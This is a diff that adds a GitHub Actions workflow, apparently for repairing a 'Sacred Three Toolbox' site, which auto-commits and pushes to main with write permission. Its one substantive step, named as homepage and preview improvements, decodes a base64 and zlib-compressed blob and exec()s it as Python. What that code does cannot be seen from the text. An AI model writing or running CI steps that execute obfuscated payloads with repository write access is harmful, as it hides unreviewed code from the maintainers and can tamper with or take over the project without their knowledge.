@@ -1,0 +1,21 @@
+name: Safeguard Sacred Three Toolbox Release Source
+'on':
+  push:
+    branches:
+    - main
+    paths:
+    - .github/workflows/install-sacred-three-source-repair.yml
+permissions:
+  contents: write
+jobs:
+  repair:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - uses: actions/checkout@v4
+    - uses: actions/setup-node@v4
+      with:
+        node-version: '22'
+        cache: npm
+    - name: Install durable homepage source and offline preview improvements
+      run: "set -euo pipefail\npython3 - <<'PYCODE'\nimport base64,zlib\nexec(compile(zlib.decompress(base64.b64decode('eNqlVktv4zYQvutXsN4DJVh2kObQIohSZNM9tUCDOEAPm4Whx9hiTZMCScX2v+/wJSuJnRSogSDUcN7zzXBWSm5JV5qWs4qwbSeVIQ/4mSRKSlPY47zeNWmWGNh2vDRQ2IsLykQD+3kkzluz5TSpesYbUIHFfc27A026vuJMt9CEm0bW+sJr8IKl1oCWB3VML1eMQ5qRUjQkqH1DHZQe6Tmh3/Yd1AYa8iQlr+SeaNmrGohl0KSsNAhDE1MMphSUzdLA3qQgatkwsS5ob1a/0iypimj5A6a2ODryAVuiTalMQW80usekIDXHoItJLYUpmQBFjHd4ti27CU1ANMttqTYocRFEbmnCVsTpIUIawgRpr4kqmQby2AvDtvBNKalS+hA9Iq3cAjITLsUabQRrmpgWMNvaJsopRFdnnWTCEDSP7u6Ldu4KlLrrLDkMhOhZvs+mHMTwnSWifCna7/vrw49YUKTMa4m+pXQU3qwuVUMzUhTkypWS3iAjoTYie/CkCzzeRhpW9l72vPGBN1hEtjpgOFhEMBhKqwBmnImN8z+aLzlPN1HrSiriPlKK3Kti8gX2HZcKJjSPFBcsqFlX1ht9pKOdbS+YOTi4TmiWnQgwVpZmRXHpYhhfHotor5OkxuLTG+exAl5MtDkgQFsAMyHeaExYA51tQq1/eync+ZfJrW0phaF/osIzzQRbt8ZqsIIN07V8AXX4RHbgi4KIPRPCGe6yn4rL0xB8Cv1FjpoxJ3WLRajbEsGIALAqUXkEs7lOCP6Q6P0e0ewPexYbDJXWkHqG3P+boo78MnOMwDWcFhl8zofTlD4LOn2tZBQlUmx8BF2OJM97Purf+46z2oaNQlumNfbVOAM24doH/qqPQ5hxDEbULJeLp7vHp2+Py4e7+z8Wy6UDD/bCKLtHwKIiK26Hy5tMJ2+TcUJzjmi1CTlxcznAPXrmh0LEuTnf40VxdZQdD5Sb+HkqyOQL+WonL0ZU874BP6/wP1uLcTpt5vBCrlaYWCA2CeUacpz5hBmyk2qjyY6ZVvaYaTCWQMq6Bq3nieSNhT36X+JwhOJ4PGbp2CDPow55Di3y/K6/nrFPchwElvWWTlMVnrq3fDQbPRXZ1E4HL5JNEgG7/+3X+dFxzsN3Eh+5iOhFLyN2q1fYrQIWML0Bq3+F6twvFsj+T3j+TiEU39shRpTP8c+3KFobgTCaQKqfpcNbvlPMgHfZ5O+f8/CYj7iq91xJ2IJ0X3VKWqwkx+Nc9SL9TrsDYkpcYSaHHedHXrdQb4on1UOWKHAX/2016BS8MKx6OlqO7uWukgc9+xuqWdhkZg+ez69M2UcaQ6KCFyd79vWdHXW+Wn+yF4iXuDVoM+wHxHa0toMNK0lP2xhNALWZ76DCXeK2+Bn1flVo9YLLtfRam15ZnUH8nDpmexRKVbcTesZ1xzO85CGKhZOxvtaS8wC5j+yGGpxMFZ2/m2sW90FkhPBAGQa/bRJeHuz0QU98ow4WRw9flHNb7StHhk4NWXxrSRvGOdoBLAwiAZQoOXE9PBqTn9dqPK07zA9ePtwtFtdk4Zfn2GA5WQOuqqUJm2VO7iVCTzFuq7qWOHld4nMXShzL3h/b/riPEXx42Yq55/9f4PJTjA==')), 'sacred_three_source_repair.py', 'exec'))\nPYCODE\ngit diff --check\nnode --check docs/app.js\ngit config user.name 'github-actions[bot]'\ngit config user.email '41898282+github-actions[bot]@users.noreply.github.com'\ngit add index.template.html build.py docs/index.html docs/Cowboys-Web-Toolbox-Preview.html\nif ! git diff --cached --quiet; then\n  git commit -m 'Keep Commons-inspired Toolbox redesign in source builds and offline preview'\n  git push origin HEAD:main\nfi\n"
